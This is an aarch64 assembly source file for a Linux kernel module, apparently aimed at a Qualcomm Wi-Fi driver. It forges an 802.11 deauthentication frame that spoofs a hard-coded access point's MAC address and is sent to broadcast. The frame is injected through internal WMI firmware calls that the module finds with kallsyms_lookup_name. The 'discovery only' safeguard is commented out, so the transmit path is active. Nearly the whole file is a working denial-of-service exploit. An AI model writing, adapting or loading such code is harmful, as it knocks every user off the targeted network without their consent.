/*
 * wmatx4.S - Send deauth via wmi_mgmt_unified_cmd_send (bypass WMA)
 *
 * Calls wmi_mgmt_unified_cmd_send(wmi_handle, &mgmt_params) directly,
 * bypassing the WMA layer that was crashing.
 *
 * wmi_mgmt_unified_cmd_send signature:
 *   QDF_STATUS wmi_mgmt_unified_cmd_send(
 *       wmi_unified_t wmi_handle,       // x0
 *       struct wmi_mgmt_params *param)  // x1
 *
 * struct wmi_mgmt_params layout (aarch64):
 *   0x00: void *tx_frame       (qdf_nbuf_t / sk_buff *)
 *   0x08: uint16_t frm_len
 *   0x0A: uint8_t vdev_id
 *   0x0B: uint8_t tx_type
 *   0x0C: uint16_t chanfreq
 *   0x0E: uint16_t desc_id
 *   0x10: void *pdata           (frame data pointer for inline copy)
 *   0x18: uint8_t *macaddr      (peer MAC address)
 *   0x20: void *qdf_ctx         (qdf_device_t for DMA mapping)
 *   0x28-0x3F: tx_send_params, flags, etc.
 *
 * Build: as -o wmatx4.o wmatx4.S && ld -r -o wmatx4.ko wmatx4.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:
    .asciz "cds_get_context"
str_wmi_send:
    .asciz "wmi_mgmt_unified_cmd_send"
str_skballoc:
    .asciz "__alloc_skb"
str_skbput:
    .asciz "skb_put"
str_kfree_skb:
    .asciz "kfree_skb"

fmt_init:
    .asciz "wmatx4: init - direct WMI mgmt TX (bypass WMA)\n"
fmt_sym:
    .asciz "wmatx4: cds=%px wmi_send=%px skballoc=%px skbput=%px kfree=%px\n"
fmt_wma:
    .asciz "wmatx4: wma=%px wmi=%px\n"
fmt_qdf:
    .asciz "wmatx4: qdf_ctx=%px\n"
fmt_skb:
    .asciz "wmatx4: skb=%px data=%px\n"
fmt_params:
    .asciz "wmatx4: params: tx_frame=%px frm_len=%d vdev_id=%d chanfreq=%d pdata=%px qdf_ctx=%px desc_id=%d\n"
fmt_call:
    .asciz "wmatx4: calling wmi_mgmt_unified_cmd_send(wmi=%px, params=%px)\n"
fmt_res:
    .asciz "wmatx4: result = %d (0=success)\n"
fmt_err:
    .asciz "wmatx4: ERROR: %s\n"
str_sym_err:
    .asciz "symbol lookup failed"
str_wma_err:
    .asciz "wma context NULL"
str_qdf_err:
    .asciz "qdf_ctx NULL"
str_skb_err:
    .asciz "skb allocation failed"
fmt_done:
    .asciz "wmatx4: done\n"
fmt_disc:
    .asciz "wmatx4: DISCOVERY ONLY - skipping actual TX call\n"

/* MAC address of target AP */
.balign 4
target_mac:
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92

/* Deauth frame: 26 bytes */
.balign 4
deauth_frame:
    .short 0x00C0       /* FC: deauth */
    .short 0x0000       /* Duration */
    .byte 0xff,0xff,0xff,0xff,0xff,0xff  /* DA: broadcast */
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92 /* SA: target AP */
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92 /* BSSID: target AP */
    .short 0x0000       /* Seq ctrl */
    .short 0x0007       /* Reason: Class 3 frame */
deauth_end:
.equ FLEN, deauth_end - deauth_frame   /* = 26 */

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-176]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]
    /* sp+96..sp+160: struct wmi_mgmt_params (0x40 = 64 bytes) */

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* ========== Resolve symbols ========== */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_wmi_send
    add x0, x0, :lo12:str_wmi_send
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x20, x0                /* x20 = wmi_mgmt_unified_cmd_send */

    adrp x0, str_skballoc
    add x0, x0, :lo12:str_skballoc
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x21, x0                /* x21 = __alloc_skb */

    adrp x0, str_skbput
    add x0, x0, :lo12:str_skbput
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x22, x0                /* x22 = skb_put */

    adrp x0, str_kfree_skb
    add x0, x0, :lo12:str_kfree_skb
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x23, x0                /* x23 = kfree_skb */

    /* Print resolved symbols */
    adrp x0, fmt_sym
    add x0, x0, :lo12:fmt_sym
    mov x1, x19
    mov x2, x20
    mov x3, x21
    mov x4, x22
    mov x5, x23
    bl printk

    /* ========== Get WMA context (needed for wmi_handle) ========== */
    mov w0, #54               /* QDF_MODULE_ID_WMA */
    blr x19
    cbz x0, .Lwmaerr
    mov x24, x0               /* x24 = wma handle */

    /* Read wma->wmi_handle [0x000] */
    ldr x25, [x24, #0]        /* x25 = wmi_handle */

    adrp x0, fmt_wma
    add x0, x0, :lo12:fmt_wma
    mov x1, x24
    mov x2, x25
    bl printk

    /* ========== Get qdf_ctx ========== */
    mov w0, #64               /* QDF_MODULE_ID_QDF_DEVICE */
    blr x19
    cbz x0, .Lqdferr
    mov x27, x0               /* x27 = qdf_ctx */

    adrp x0, fmt_qdf
    add x0, x0, :lo12:fmt_qdf
    mov x1, x27
    bl printk

    /* ========== Allocate skb ========== */
    mov w0, #128              /* size = 128 bytes (extra room for DMA alignment) */
    mov w1, #0xCC0             /* GFP_KERNEL */
    mov w2, #0                 /* flags */
    mov w3, #-1                /* NUMA_NO_NODE */
    blr x21                   /* __alloc_skb */
    cbz x0, .Lskberr
    mov x26, x0               /* x26 = skb */

    /* skb_put(skb, FLEN) to set len and get data pointer */
    mov x0, x26
    mov w1, #FLEN
    blr x22
    mov x28, x0               /* x28 = data pointer */

    adrp x0, fmt_skb
    add x0, x0, :lo12:fmt_skb
    mov x1, x26
    mov x2, x28
    bl printk

    /* ========== Copy deauth frame into skb data ========== */
    adrp x8, deauth_frame
    add x8, x8, :lo12:deauth_frame
    mov x9, x28
    mov w10, #FLEN
.Lcopy:
    cbz w10, .Lcopy_done
    ldrb w11, [x8], #1
    strb w11, [x9], #1
    sub w10, w10, #1
    b .Lcopy
.Lcopy_done:

    /* ========== Build struct wmi_mgmt_params on stack ========== */
    add x8, sp, #96
    /* Zero the struct (64 bytes) */
    stp xzr, xzr, [x8, #0]
    stp xzr, xzr, [x8, #16]
    stp xzr, xzr, [x8, #32]
    stp xzr, xzr, [x8, #48]

    /* tx_frame [0x00] = skb */
    str x26, [x8, #0x00]

    /* frm_len [0x08] = 26 */
    mov w0, #FLEN
    strh w0, [x8, #0x08]

    /* vdev_id [0x0A] = 0 */
    strb wzr, [x8, #0x0A]

    /* tx_type [0x0B] = 0 (MGMT_FRM_TYPE) */
    strb wzr, [x8, #0x0B]

    /* chanfreq [0x0C] = 2412 */
    mov w0, #2412
    strh w0, [x8, #0x0C]

    /* desc_id [0x0E] = 0xFFFF (unused / max - avoid conflicting with real descriptors) */
    mov w0, #0xFFFF
    strh w0, [x8, #0x0E]

    /* pdata [0x10] = data pointer in skb */
    str x28, [x8, #0x10]

    /* macaddr [0x18] = pointer to target MAC (broadcast for deauth) */
    adrp x0, target_mac
    add x0, x0, :lo12:target_mac
    str x0, [x8, #0x18]

    /* qdf_ctx [0x20] = qdf_device_t */
    str x27, [x8, #0x20]

    /* tx_send_params [0x28] = 0 (already zeroed) */
    /* tx_params_valid [0x30] = 0 (let firmware decide rate/power) */
    /* use_6mbps [0x31] = 0 */
    /* tx_flags [0x34] = 0 */

    /* Print params for verification */
    adrp x0, fmt_params
    add x0, x0, :lo12:fmt_params
    ldr x1, [x8, #0x00]       /* tx_frame */
    ldrh w2, [x8, #0x08]      /* frm_len */
    ldrb w3, [x8, #0x0A]      /* vdev_id */
    ldrh w4, [x8, #0x0C]      /* chanfreq */
    ldr x5, [x8, #0x10]       /* pdata */
    ldr x6, [x8, #0x20]       /* qdf_ctx */
    ldrh w7, [x8, #0x0E]      /* desc_id */
    bl printk

    /* ========== Call wmi_mgmt_unified_cmd_send directly ========== */
    adrp x0, fmt_call
    add x0, x0, :lo12:fmt_call
    mov x1, x25                /* wmi_handle */
    add x2, sp, #96            /* params ptr */
    bl printk

    /* DISCOVERY MODE - comment out the b .Ldisc_skip to enable actual TX */
    //b .Ldisc_skip

    mov x0, x25                /* wmi_handle */
    add x1, sp, #96            /* &mgmt_params */
    blr x20                    /* wmi_mgmt_unified_cmd_send(wmi_handle, &params) */
    mov w27, w0                /* save result (clobbers x27/qdf_ctx - no longer needed) */

    adrp x0, fmt_res
    add x0, x0, :lo12:fmt_res
    mov w1, w27
    bl printk

    /* If non-zero, skb was not consumed - free it */
    cbnz w27, .Lfree_skb
    b .Lok

.Ldisc_skip:
    adrp x0, fmt_disc
    add x0, x0, :lo12:fmt_disc
    bl printk
    /* Free skb since we didn't send it */
    mov x0, x26
    blr x23
    b .Lok

.Lfree_skb:
    mov x0, x26
    blr x23
    b .Lok

.Lsymerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_sym_err
    add x1, x1, :lo12:str_sym_err
    bl printk
    mov w0, #-1
    b .Lret

.Lwmaerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_wma_err
    add x1, x1, :lo12:str_wma_err
    bl printk
    mov w0, #-1
    b .Lret

.Lqdferr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_qdf_err
    add x1, x1, :lo12:str_qdf_err
    bl printk
    mov w0, #-1
    b .Lret

.Lskberr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_skb_err
    add x1, x1, :lo12:str_skb_err
    bl printk
    mov w0, #-1
    b .Lret

.Lok:
    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0

.Lret:
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #176
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8

.section .init.plt, "ax"
    .balign 8
    .space 8

.section .text.ftrace_trampoline, "ax"
    .balign 8
    .space 8
